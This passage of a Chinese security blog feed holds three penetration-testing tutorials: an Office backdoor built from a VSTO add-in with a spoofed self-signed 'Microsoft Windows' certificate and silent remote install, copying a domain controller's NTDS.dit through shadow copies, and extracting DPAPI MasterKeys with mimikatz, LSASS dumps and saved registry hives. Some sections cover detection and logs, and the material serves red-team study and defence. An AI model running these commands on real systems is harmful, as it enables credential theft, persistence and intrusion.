rel="noopener">LEAVE A REPLY</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script src=&quot;\assets\js\APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;hr
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>利用VSTO实现的office后门</title>
    <link href="wiki.cfyqy.com/posts/86739fb1.html"/>
    <id>wiki.cfyqy.com/posts/86739fb1.html</id>
    <published>2018-05-25T13:03:44.907Z</published>
    <updated>2018-05-25T13:04:28.156Z</updated>
    
    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>–</p><p>最近看了一篇文章《VSTO: The Payload Installer That Probably Defeats Your Application Whitelisting Rules》，介绍了利用VSTO实现Office后门的方法，我在之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/Use-Office-to-maintain-persistence/" target="_blank" rel="noopener">《Use Office to maintain persistence》</a>和<a href="https://3gstudent.github.io/3gstudent.github.io/Office-Persistence-on-x64-operating-system/" target="_blank" rel="noopener">《Office Persistence on x64 operating system》</a>曾对Office的后门进行过学习，本文将结合自己的研究心得，对该方法进行复现，分析利用思路，分享实际利用方法，最后介绍如何识别这种后门。</p><p>文章地址：</p><p><a href="https://bohops.com/2018/01/31/vsto-the-payload-installer-that-probably-defeats-your-application-whitelisting-rules/" target="_blank" rel="noopener">https://bohops.com/2018/01/31/vsto-the-payload-installer-that-probably-defeats-your-application-whitelisting-rules/</a></p><h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><hr><p>本文将要介绍以下内容：</p><ul><li>VSTO的编写方法</li><li>实际利用思路</li><li>后门检测</li></ul><h2 id="0x02-VSTO的编写方法"><a href="#0x02-VSTO的编写方法" class="headerlink" title="0x02 VSTO的编写方法"></a>0x02 VSTO的编写方法</h2><hr><h3 id="1、VSTO简介"><a href="#1、VSTO简介" class="headerlink" title="1、VSTO简介"></a>1、VSTO简介</h3><p>全称Visual Studio Tools for Office</p><p>用来定制Office应用程序，能够同office控件交互</p><p>集成在Visual Studio安装包中</p><p>如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-3/2-1.png" alt="Alt text"></p><h3 id="2、VSTO开发"><a href="#2、VSTO开发" class="headerlink" title="2、VSTO开发"></a>2、VSTO开发</h3><p>本节内容是对《VSTO: The Payload Installer That Probably Defeats Your Application Whitelisting Rules》的复现</p><h4 id="1-新建工程"><a href="#1-新建工程" class="headerlink" title="(1) 新建工程"></a>(1) 新建工程</h4><p><code>Visual c#</code> -&gt; <code>Office</code> -&gt; <code>Word 2010外接程序</code></p><p>如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-3/2-2.png" alt="Alt text"></p><h4 id="2-添加代码"><a href="#2-添加代码" class="headerlink" title="(2) 添加代码"></a>(2) 添加代码</h4><p>添加引用<code>System.Windows.Forms</code></p><p>添加弹框代码：</p><pre><code>using System.Windows.Forms;MessageBox.Show(&quot;1&quot;);</code></pre><p>如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-3/2-3.png" alt="Alt text"></p><h4 id="3-编译"><a href="#3-编译" class="headerlink" title="(3) 编译"></a>(3) 编译</h4><p>设置对应.Net版本，编译，生成如下6个文件：</p><ul><li>Microsoft.Office.Tools.Common.v4.0.Utilities.dll</li><li>Microsoft.Office.Tools.Common.v4.0.Utilities.xml</li><li>WordAddIn2.dll</li><li>WordAddIn2.dll.manifest</li><li>WordAddIn2.pdb</li><li>WordAddIn2.vsto</li></ul><h4 id="4-安装插件"><a href="#4-安装插件" class="headerlink" title="(4) 安装插件"></a>(4) 安装插件</h4><p>执行WordAddIn2.vsto</p><p>弹框提示无法验证发行者，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-3/2-4.png" alt="Alt text"></p><p>选择安装</p><p>查看<code>控制面板</code> -&gt; <code>程序</code> -&gt; <code>程序和功能</code>，能够找到新安装的插件</p><p>####　(5) 打开word.exe，自动加载插件</p><p>弹框，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-3/2-5.png" alt="Alt text"></p><p>查看Word加载项，能够看到加载插件WordAddIn2，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-3/2-6.png" alt="Alt text"></p><p>至此，成功实现Office后门的安装</p><h2 id="0x03-实际利用思路"><a href="#0x03-实际利用思路" class="headerlink" title="0x03 实际利用思路"></a>0x03 实际利用思路</h2><hr><p>对于实际利用，首先需要满足安装过程无界面，所以要绕过弹框提示无法验证发行者，需要做如下改进：</p><h4 id="1-命令行安装VSTO插件"><a href="#1-命令行安装VSTO插件" class="headerlink" title="(1) 命令行安装VSTO插件"></a>(1) 命令行安装VSTO插件</h4><p>使用VSTOInstaller.exe</p><p>系统安装Office后包含，默认路径<code>%ProgramFiles%\Common Files\microsoft shared\VSTO\10.0</code></p><p>参数说明：</p><p>/i: 安装</p><p>/u: 卸载</p><p>/s: 静默操作，如果需要信任提示，将不会安装或更新自定义项</p><p>安装参数如下：</p><pre><code>&quot;C:\Program Files\Common Files\microsoft shared\VSTO\10.0\VSTOInstaller.exe&quot; /i /s c:\test\WordAddIn2</code></pre><p>由于信任提示，无法验证发行者，所以安装失败</p><h4 id="2-绕过验证发行者"><a href="#2-绕过验证发行者" class="headerlink" title="(2) 绕过验证发行者"></a>(2) 绕过验证发行者</h4><p>VSTO插件提供签名功能，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-3/3-1.png" alt="Alt text"></p><p>手动生成一组签名证书，使用如下工具</p><ul><li>makecert.exe</li><li>cert2spc.exe</li><li>pvk2pfx.exe</li><li>certmgr.exe</li></ul><p>来自于Windows SDK，可供参考下载的地址：</p><p><a href="https://github.com/3gstudent/signtools" target="_blank" rel="noopener">https://github.com/3gstudent/signtools</a></p><p>生成命令：</p><pre><code>makecert -n &quot;CN=Microsoft Windows&quot; -r -sv Root.pvk Root.cercert2spc Root.cer Root.spcpvk2pfx -pvk Root.pvk -pi 12345678password -spc Root.spc -pfx Root.pfx -f</code></pre><p>执行后生成Root.cer、Root.pfx、Root.pvk、Root.spc四个文件</p><p>替换插件WordAddIn2的证书，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-3/3-2.png" alt="Alt text"></p><p>证书注册（管理员权限）：</p><pre><code>certmgr.exe -add Root.cer -c -s -r localMachine TrustedPublishercertmgr.exe -add -c Root.cer -s -r localmachine root</code></pre><p><strong>注：</strong></p><p>需要将证书同时添加到<code>TrustedPublisher</code>和<code>root</code></p><p>再次安装VSTO插件，不会被拦截</p><h4 id="3-远程安装"><a href="#3-远程安装" class="headerlink" title="(3) 远程安装"></a>(3) 远程安装</h4><p>VSTOInstaller.exe支持远程安装</p><p>可以将VSTO插件放在远程Web服务器上</p><p>安装参数如下：</p><pre><code>&quot;C:\Program Files\Common Files\microsoft shared\VSTO\10.0\VSTOInstaller.exe&quot; /s /i http://192.168.62.131/1/WordAddIn1.vsto</code></pre><p>综上，实际利用过程如下： </p><ul><li>生成VSTO插件</li><li>为插件添加签名</li><li>证书注册</li><li>远程下载安装</li></ul><h2 id="0x04-后门检测"><a href="#0x04-后门检测" class="headerlink" title="0x04 后门检测"></a>0x04 后门检测</h2><hr><p>1、查看<code>控制面板</code> -&gt; <code>程序</code> -&gt; <code>程序和功能</code>，是否有可疑插件</p><p><strong>注：</strong></p><p>VSTO插件并不会在注册表卸载配置的位置(<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\</code>)创建新键值</p><p>2、查看Office的COM加载项</p><p><strong>注：</strong></p><p>禁用宏并不会阻止VSTO插件的加载</p><h2 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h2><hr><p>本文测试了利用VSTO实现Office后门的方法，结合实际利用思路，分析检测方法</p><hr><p><a href="https://github.com/3gstudent/feedback/issues/new" target="_blank" rel="noopener">LEAVE A REPLY</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script src=&quot;\assets\js\APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>域渗透——获得域控服务器的NTDS.dit文件</title>
    <link href="wiki.cfyqy.com/posts/8eed51f1.html"/>
    <id>wiki.cfyqy.com/posts/8eed51f1.html</id>
    <published>2018-05-25T13:03:44.905Z</published>
    <updated>2018-05-25T13:04:28.155Z</updated>
    
    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><hr><p>在之前的文章《导出当前域内所有用户hash的技术整理》曾介绍过通过Volume Shadow Copy实现对ntds.dit文件的复制， 可用来导出域内所有用户hash。本文将尝试做系统总结，总结多种不同的方法。</p><h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><hr><p>本文将要介绍以下内容：</p><ul><li>多种实现方法</li><li>比较优缺点</li></ul><h2 id="0x02-通过Volume-Shadow-Copy获得域控服务器NTDS-dit文件"><a href="#0x02-通过Volume-Shadow-Copy获得域控服务器NTDS-dit文件" class="headerlink" title="0x02 通过Volume Shadow Copy获得域控服务器NTDS.dit文件"></a>0x02 通过Volume Shadow Copy获得域控服务器NTDS.dit文件</h2><hr><p>测试系统：</p><ul><li>Server 2008 R2 x64</li><li>Server 2012 R2 x64</li></ul><p><strong>Volume Shadow Copy Service：</strong></p><ul><li>用于数据备份</li><li>支持Windows Server 2003 及以上操作系统</li><li>系统默认在特定条件下自动创建数据备份，如补丁安装后。在Win7系统大概每隔一周自动创建备份，该时间无法确定</li><li>禁用VSS会影响系统正常使用，如 System Restore和 Windows Server Backup</li></ul><h3 id="1、ntdsutil"><a href="#1、ntdsutil" class="headerlink" title="1、ntdsutil"></a>1、ntdsutil</h3><p>域环境默认安装</p><p>支持系统：</p><ul><li>Server 2003</li><li>Server 2008</li><li>Server 2012</li><li>…</li></ul><h4 id="常用命令："><a href="#常用命令：" class="headerlink" title="常用命令："></a>常用命令：</h4><p>(1) 查询当前快照列表</p><pre><code>ntdsutil snapshot &quot;List All&quot; quit quit</code></pre><p>(2) 查询已挂载的快照列表</p><pre><code>ntdsutil snapshot &quot;List Mounted&quot; quit quit</code></pre><p>(3) 创建快照</p><pre><code>ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit</code></pre><p>(4) 挂载快照</p><pre><code>ntdsutil snapshot &quot;mount GUID&quot; quit quit</code></pre><p>(5) 卸载快照:</p><pre><code>ntdsutil snapshot &quot;unmount GUID&quot; quit quit</code></pre><p>(6) 删除快照</p><pre><code>ntdsutil snapshot &quot;delete GUID&quot; quit quit</code></pre><h4 id="实际测试："><a href="#实际测试：" class="headerlink" title="实际测试："></a>实际测试：</h4><p>(1) 查询当前系统的快照</p><pre><code>ntdsutil snapshot &quot;List All&quot; quit quitntdsutil snapshot &quot;List Mounted&quot; quit quit</code></pre><p>(2) 创建快照</p><pre><code>ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit</code></pre><p>guid为<code>{6e31c0ab-c517-420b-845d-c38acbf77ab9}</code></p><p>如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-27/2-1.png" alt="Alt text"></p><p>(3) 挂载快照</p><pre><code>ntdsutil snapshot &quot;mount {6e31c0ab-c517-420b-845d-c38acbf77ab9}&quot; quit quit</code></pre><p>快照挂载为<code>C:\$SNAP_201802270645_VOLUMEC$\</code>，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-27/2-2.png" alt="Alt text"></p><p>(4) 复制ntds.dit</p><pre><code>copy C:\$SNAP_201802270645_VOLUMEC$\windows\NTDS\ntds.dit c:\ntds.dit</code></pre><p>(5) 卸载快照:</p><pre><code>ntdsutil snapshot  &quot;unmount {6e31c0ab-c517-420b-845d-c38acbf77ab9}&quot; quit quit</code></pre><p>(6) 删除快照</p><pre><code>ntdsutil snapshot  &quot;delete {6e31c0ab-c517-420b-845d-c38acbf77ab9}&quot; quit quit</code></pre><h3 id="2、vssadmin"><a href="#2、vssadmin" class="headerlink" title="2、vssadmin"></a>2、vssadmin</h3><p>域环境默认安装</p><p>支持系统：</p><ul><li>Server 2008</li><li>Server 2012</li><li>…</li></ul><h4 id="常用命令：-1"><a href="#常用命令：-1" class="headerlink" title="常用命令："></a>常用命令：</h4><p>(1) 查询当前系统的快照</p><pre><code>vssadmin list shadows</code></pre><p>(2) 创建快照</p><pre><code>vssadmin create shadow /for=c:</code></pre><p>(3) 删除快照</p><pre><code>vssadmin delete shadows /for=c: /quiet</code></pre><h4 id="实际测试：-1"><a href="#实际测试：-1" class="headerlink" title="实际测试："></a>实际测试：</h4><p>(1) 查询当前系统的快照</p><pre><code>vssadmin list shadows</code></pre><p>(2) 创建快照</p><pre><code>vssadmin create shadow /for=c:</code></pre><p>获得Shadow Copy Volume Name为<code>\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12</code></p><p>如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-27/2-3.png" alt="Alt text"></p><p>(3) 复制ntds.dit</p><pre><code>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12\windows\NTDS\ntds.dit c:\ntds.dit</code></pre><p>(4) 删除快照</p><pre><code>vssadmin delete shadows /for=c: /quiet</code></pre><h3 id="3、vshadow-exe"><a href="#3、vshadow-exe" class="headerlink" title="3、vshadow.exe"></a>3、vshadow.exe</h3><p>系统默认不支持,，可在Microsoft Windows Software Development Kit (SDK)中获得该工具</p><p><strong>注：</strong></p><p>64位系统需要使用64位的vshadow.exe</p><p>不同系统可供使用的vshadow.exe下载地址：</p><p><a href="http://edgylogic.com/blog/vshadow-exe-versions/" target="_blank" rel="noopener">http://edgylogic.com/blog/vshadow-exe-versions/</a></p><h4 id="常用命令：-2"><a href="#常用命令：-2" class="headerlink" title="常用命令："></a>常用命令：</h4><p>(1) 查询当前系统的快照</p><pre><code>vshadow.exe -q</code></pre><p>(2) 创建快照</p><pre><code>vshadow.exe -p -nw C:</code></pre><p>参数说明：</p><p>-p persistent，备份操作或是重启系统不会删除</p><p>-nw no writers，用来提高创建速度</p><p>C: 对应c盘</p><p>(3) 删除快照</p><pre><code>vshadow -dx=ShadowCopySetIdvshadow -ds=ShadowCopyId</code></pre><h4 id="实际测试：-2"><a href="#实际测试：-2" class="headerlink" title="实际测试："></a>实际测试：</h4><p>(1) 查询当前系统的快照</p><pre><code>vshadow.exe -q</code></pre><p>(2) 创建快照</p><pre><code>vshadow.exe -p -nw C:</code></pre><p>获得SnapshotSetID为<code>{809b77cc-cf9a-4101-b802-08e97d10e613}</code></p><p>获得SnapshotID为<code>{ef99d039-9a38-4e8b-9f57-e3113d464f76}</code></p><p>获得Shadow copy device name为<code>\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy10</code></p><p>如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-27/2-4.png" alt="Alt text"></p><p>(3) 复制ntds.dit</p><pre><code>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy10\windows\NTDS\ntds.dit c:\ntds.dit</code></pre><p>(4) 删除快照</p><pre><code>vshadow -dx={809b77cc-cf9a-4101-b802-08e97d10e613}</code></pre><p>or</p><pre><code>vshadow -ds={ef99d039-9a38-4e8b-9f57-e3113d464f76}</code></pre><h3 id="4、vssown-vbs"><a href="#4、vssown-vbs" class="headerlink" title="4、vssown.vbs"></a>4、vssown.vbs</h3><p>可供参考的下载地址：</p><p><a href="https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs" target="_blank" rel="noopener">https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs</a></p><p>本质上是通过wmi对ShadowCopy进行操作</p><p>通过wmi查询快照信息：</p><pre><code>wmic /NAMESPACE:&quot;\\root\CIMV2&quot; PATH Win32_ShadowCopy GET DeviceObject,ID,InstallDate /FORMAT:list</code></pre><p>powershell实现：</p><p><a href="https://github.com/samratashok/nishang/blob/master/Gather/Copy-VSS.ps1" target="_blank" rel="noopener">https://github.com/samratashok/nishang/blob/master/Gather/Copy-VSS.ps1</a></p><h3 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h3><h4 id="1、日志文件"><a href="#1、日志文件" class="headerlink" title="1、日志文件"></a>1、日志文件</h4><p>调用Volume Shadow Copy服务会产生日志文件，位于System下，Event ID为7036</p><p>执行<code>ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit</code>会额外产生Event ID为98的日志文件</p><p>如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-27/2-5.png" alt="Alt text"></p><h4 id="2、访问快照中的文件"><a href="#2、访问快照中的文件" class="headerlink" title="2、访问快照中的文件"></a>2、访问快照中的文件</h4><p>查看快照列表：</p><pre><code>vssadmin list shadows</code></pre><p>无法直接访问<code>\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12</code>中的文件</p><p>可通过创建符号链接访问快照中的文件：</p><pre><code>mklink /d c:\testvsc \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12\</code></pre><p>如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-27/2-6.png" alt="Alt text"></p><p>删除符号链接：</p><pre><code>rd c:\testvsc</code></pre><p>利用思路：</p><p>如果当前系统存在快照文件，可对系统的历史文件进行访问</p><h4 id="3、利用vshadow执行命令"><a href="#3、利用vshadow执行命令" class="headerlink" title="3、利用vshadow执行命令"></a>3、利用vshadow执行命令</h4><p>参考资料：</p><p><a href="https://bohops.com/2018/02/10/vshadow-abusing-the-volume-shadow-service-for-evasion-persistence-and-active-directory-database-extraction/" target="_blank" rel="noopener">https://bohops.com/2018/02/10/vshadow-abusing-the-volume-shadow-service-for-evasion-persistence-and-active-directory-database-extraction/</a></p><p>执行命令：</p><pre><code>vshadow.exe -nw -exec=c:\windows\system32\notepad.exe c:</code></pre><p>执行后，后台存在进程VSSVC.exe，同时显示服务Volume Shadow Copy正在运行，需要手动关闭进程VSSVC.exe</p><p><strong>注：</strong></p><p>手动关闭进程VSSVC.exe会生成日志7034</p><p>利用思路：</p><p>vshadow.exe包含微软签名，能绕过某些白名单的限制。如果作为启动项，Autoruns的默认启动列表不显示</p><h2 id="0x03-通过NinjaCopy获得域控服务器NTDS-dit文件"><a href="#0x03-通过NinjaCopy获得域控服务器NTDS-dit文件" class="headerlink" title="0x03 通过NinjaCopy获得域控服务器NTDS.dit文件"></a>0x03 通过NinjaCopy获得域控服务器NTDS.dit文件</h2><hr><p>下载地址：</p><p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1</a></p><p>没有调用Volume Shadow Copy服务，所以不会产生日志文件7036</p><h2 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h2><hr><p>本文整理了多种获得域控服务器NTDS.dit文件的方法，测试使用环境，比较优缺点。</p><hr><p><a href="https://github.com/3gstudent/feedback/issues/new" target="_blank" rel="noopener">LEAVE A REPLY</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script src=&quot;\assets\js\APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;hr
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>渗透技巧——获取Windows系统下DPAPI中的MasterKey</title>
    <link href="wiki.cfyqy.com/posts/67034cad.html"/>
    <id>wiki.cfyqy.com/posts/67034cad.html</id>
    <published>2018-05-25T13:03:44.904Z</published>
    <updated>2018-05-25T13:04:28.154Z</updated>
    
    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><hr><p>对于Windows系统，用户的加密数据大都采用DPAPI进行存储，而想要解密这些数据解，必须要获得DPAPI对应的MasterKey。本文将会介绍在获得了Windows系统的权限后获得MasterKey的方法，同时分析Preferred文件格式，延长MasterKey的有效期</p><h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><hr><p>本文将要介绍以下内容</p><ul><li>基本概念</li><li>获得MasterKey的方法</li><li>解析Preferred文件</li><li>修改MasterKey失效时间</li></ul><h2 id="0x02-基本概念"><a href="#0x02-基本概念" class="headerlink" title="0x02 基本概念"></a>0x02 基本概念</h2><hr><h4 id="DPAPI："><a href="#DPAPI：" class="headerlink" title="DPAPI："></a>DPAPI：</h4><p>全称Data Protection Application Programming Interface</p><p>作为Windows系统的一个数据保护接口被广泛使用</p><p>主要用于保护加密的数据，常见的应用如：</p><ul><li>EFS文件加密</li><li>存储无线连接密码</li><li>Windows Credential Manager</li><li>Internet Explorer</li><li>Outlook</li><li>Skype</li><li>Windows CardSpace</li><li>Windows Vault</li><li>Google Chrome</li></ul><h4 id="Master-Key："><a href="#Master-Key：" class="headerlink" title="Master Key："></a>Master Key：</h4><p>64字节，用于解密DPAPI blob，使用用户登录密码、SID和16字节随机数加密后保存在Master Key file中</p><h4 id="Master-Key-file："><a href="#Master-Key-file：" class="headerlink" title="Master Key file："></a>Master Key file：</h4><p>二进制文件，可使用用户登录密码对其解密，获得Master Key</p><p>分为两种：</p><ul><li>用户Master Key file，位于%APPDATA%\Microsoft\Protect\%SID%</li><li>系统Master Key file，位于%WINDIR%\System32\Microsoft\Protect\S-1-5-18\User</li></ul><h4 id="Preferred文件："><a href="#Preferred文件：" class="headerlink" title="Preferred文件："></a>Preferred文件：</h4><p>位于Master Key file的同级目录，显示当前系统正在使用的MasterKey及其过期时间，默认90天有效期</p><h2 id="0x03-获得MasterKey的方法"><a href="#0x03-获得MasterKey的方法" class="headerlink" title="0x03 获得MasterKey的方法"></a>0x03 获得MasterKey的方法</h2><hr><p>本节主要介绍通过mimikatz获得MasterKey的方法</p><h3 id="1、在线获取"><a href="#1、在线获取" class="headerlink" title="1、在线获取"></a>1、在线获取</h3><p>通过读取Lsass进程信息，获取当前系统中的MasterKey，能获得多个Master Key file对应的MasterKey</p><p>管理员权限：</p><pre><code>privilege::debugsekurlsa::dpapi</code></pre><p>如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-17/2-1.png" alt="Alt text"></p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-17/2-2.png" alt="Alt text"></p><h3 id="2、离线读取"><a href="#2、离线读取" class="headerlink" title="2、离线读取"></a>2、离线读取</h3><h4 id="思路一："><a href="#思路一：" class="headerlink" title="思路一："></a>思路一：</h4><p>使用procdump dump出LSASS进程内存</p><p>管理员权限：</p><pre><code>procdump.exe -accepteula -ma lsass.exe lsass.dmp</code></pre><p>使用mimikatz加载dmp文件并获取各个Master Key file对应的MasterKey：</p><pre><code>sekurlsa::minidump lsass.dmpsekurlsa::dpapi</code></pre><h4 id="思路二："><a href="#思路二：" class="headerlink" title="思路二："></a>思路二：</h4><p>参考资料：</p><p><a href="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-scheduled-tasks-credentials" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz/wiki/howto-~-scheduled-tasks-credentials</a></p><p>1、复制注册表文件</p><p>管理员权限：</p><pre><code>reg save HKLM\SYSTEM SystemBkup.hivreg save HKLM\SECURITY SECURITY.hiv</code></pre><p>2、从注册表文件中获得DPAPI_SYSTEM</p><pre><code>mimikatz log &quot;lsadump::secrets /system:SystemBkup.hiv /security:SECURITY.hiv&quot;</code></pre><p>如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-17/2-3.png" alt="Alt text"></p><p>DPAPI_SYSTEM中的user hash为<code>c2872cf6d6d4db31c6c8d33beb49b482e78e7ce3</code>，能够用来解密位于<code>%WINDIR%\System32\Microsoft\Protect\S-1-5-18\User</code>下的系统Master Key file</p><p>3、解密系统Master Key file，获得MasterKey</p><pre><code>mimikatz &quot;dpapi::masterkey /in:C:\Windows\System32\Microsoft\Protect\S-1-5-18\User\04ece708-132d-4bf0-a647-e3329269a012 /system:c2872cf6d6d4db31c6c8d33beb49b482e78e7ce3&quot;</code></pre><p>解密获得MasterKey为<code>3e9d7f32f2e57933ead318d075efc82325697d87d992b626a20abb5f0ffba6f073d282a837b6fa058ecff36039aa944e04b3dfb666ebace44aad6bff8789ca43</code></p><p>如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-17/2-4.png" alt="Alt text"></p><h2 id="0x04-解析Preferred文件"><a href="#0x04-解析Preferred文件" class="headerlink" title="0x04 解析Preferred文件"></a>0x04 解析Preferred文件</h2><hr><p>位于Master Key file的同级目录，显示当前系统正在使用的MasterKey file及其过期时间</p><p>格式如下：</p><pre><code>typedef struct _tagPreferredMasterKey{    GUID guidMasterKey;    FILETIME ftCreated;} PREFERREDMASTERKEY, *PPREFERREDMASTERKEY;</code></pre><p>例如<code>C:\Users\b\AppData\Roaming\Microsoft\Protect\S-1-5-21-2884853959-2080156797-250722187-1002\Preferred</code></p><p>如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-17/3-1.png" alt="Alt text"></p><p>前16字节<code>F6 B0 11 A1 D7 B4 C8 40 B5 36 67 2A 82 88 B9 58</code>对应guid，调整格式后，对应文件为<code>a111b0f6-b4d7-40c8-b536-672a8288b958</code></p><p>后8字节<code>D0 08 9F 7D 11 EC D3 01</code>对应过期时间</p><p>对于表示时间的FILETIME，格式如下：</p><pre><code>typedef struct _FILETIME {                            DWORD dwLowDateTime;                            DWORD dwHighDateTime;  } FILETIME, *PFILETIME;</code></pre><p>想要显示成日常使用的时间格式，需要将FILETIME类型转成SYSTEMTIME类型</p><p>在程序实现上，还需要注意使用sscanf_s函数将字符串转换为DWORD格式</p><p>可供参考的C代码如下：</p><pre><code>#include &lt;windows.h&gt;int main(void)  {      FILE *fp;      unsigned char buf[24];    fopen_s(&amp;fp,&quot;Preferred&quot;,&quot;rb&quot;);      fread(buf,1,24,fp);    printf(&quot;Data: &quot;);    for(int i=0;i&lt;24;i++)    {        printf(&quot;%02x&quot;,buf[i]);    }    fclose(fp);    printf(&quot;\nguidMasterKey: %02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x\n&quot;,buf[3],buf[2],buf[1],buf[0],buf[5],buf[4],buf[7],buf[6],buf[8],buf[9],buf[10],buf[11],buf[12],buf[13],buf[14],buf[15]);    char lowDateTime[9],highDateTime[9];    sprintf_s(lowDateTime,9,&quot;%02X%02X%02X%02X&quot;,buf[19],buf[18],buf[17],buf[16]);    sprintf_s(highDateTime,9,&quot;%02X%02X%02X%02X&quot;,buf[23],buf[22],buf[21],buf[20]);    printf(&quot;dwLowDateTime:%s\n&quot;,lowDateTime);    printf(&quot;dwHighDateTime:%s\n&quot;,highDateTime);    FILETIME        ftUTC;    SYSTEMTIME      stUTC2;    sscanf_s(lowDateTime,&quot;%x&quot;,&amp;ftUTC.dwLowDateTime);    sscanf_s(highDateTime,&quot;%x&quot;,&amp;ftUTC.dwHighDateTime);    FileTimeToSystemTime(&amp;ftUTC, &amp;stUTC2);      printf(&quot;&quot;);    printf(&quot;Expiry time: %d-%d-%d %d:%d:%d\n&quot;, stUTC2.wYear, stUTC2.wMonth, stUTC2.wDay, stUTC2.wHour, stUTC2.wMinute, stUTC2.wSecond);      return 0;  } </code></pre><p><strong>注：</strong></p><p>也可以使用fread读取int型数据来解决字符串倒序的问题</p><p>读取Preferred文件，解析出当前系统正在使用的Master Key file的guid和过期时间</p><p>测试如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-17/3-2.png" alt="Alt text"></p><h2 id="0x05-修改MasterKey失效时间"><a href="#0x05-修改MasterKey失效时间" class="headerlink" title="0x05 修改MasterKey失效时间"></a>0x05 修改MasterKey失效时间</h2><hr><p>修改思路：</p><p>输入过期时间，将过期时间转为FILETIME格式，替换Preferred文件的FILETIME</p><p>可供参考的c代码如下：</p><pre><code>#include &lt;windows.h&gt;  int main(void)  {      SYSTEMTIME st={0};    FILETIME   ft={0};    printf(&quot;[+]Start to change expiry time...\n&quot;);        st.wYear = 2019;    st.wMonth = 12;    st.wDay = 30;    st.wHour = 12;    st.wMinute = 30;    st.wSecond = 30;    printf(&quot;[+]New expiry time:%d-%d-%d %d:%d:%d\n&quot;, st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);    SystemTimeToFileTime(&amp;st,&amp;ft);    